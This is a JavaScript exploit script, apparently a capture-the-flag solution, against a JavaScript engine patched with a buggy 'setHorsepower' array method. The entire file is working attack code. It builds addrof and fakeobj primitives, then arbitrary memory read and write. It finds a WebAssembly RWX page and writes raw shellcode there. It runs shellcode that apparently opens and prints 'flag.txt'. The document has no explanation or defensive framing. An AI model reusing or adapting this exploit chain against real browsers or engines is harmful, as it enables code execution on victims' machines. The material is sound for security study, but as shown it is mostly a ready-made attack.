/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

arr = [1.1]
arr.setHorsepower(2);
float_array_map = ftoi(arr[1]);
obj_array_map = float_array_map + 0x50n;
function addrof(target) {
    arr[1] = itof(obj_array_map);
    arr[0] = target;
    arr[1] = (itof(float_array_map));
    return ftoi(arr[0]) & 0xffffffffn;
}
function fakeobj(addr) {
    arr[0] = itof(addr);
    arr[1] = itof(obj_array_map);
    let fake = arr[0];
    arr[1] = itof(float_array_map);
    return fake;
}
var arr2 = [itof(float_array_map), 1.1, 2.2, 3.3];
var fake = fakeobj(addrof(arr2)-0x20n);
function arbread(addr) {
    if (addr % 2n == 0) {
        addr += 1;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    return ftoi(fake[0]);
}

function arbwrite(addr, val) {
    if (addr % 2n == 0) {
        addr += 1;
    }
    arr2[1] = itof((2n << 32n) + addr - 8n);
    fake[0] = itof(BigInt(val));
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
leaker = addrof(wasm_instance);
rwx_page = arbread(BigInt(leaker)+0x68n);
function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    let backing_store_addr = buf_addr + 0x14n;
    arbwrite(backing_store_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}
shellcode = [0x41c0314d, 0x66bf4950, 0x2e67616c, 0x41747874, 0xe7894857, 0x48f63148, 0xc748d231, 0x2c0, 0x48050f00, 0xc748c789, 0xc0, 0xe6894800, 0x64c2c748, 0xf000000, 0xc0c74805, 0x1, 0x2c7c748, 0x48000000, 0xc748e689, 0x64c2, 0x50f00]
console.log("[*] Copying shellcode to rwx page")
console.log("[*] rwx @" + rwx_page.toString(16))
copy_shellcode(rwx_page, shellcode);
console.log("[*] Executing shellcode...");
f();
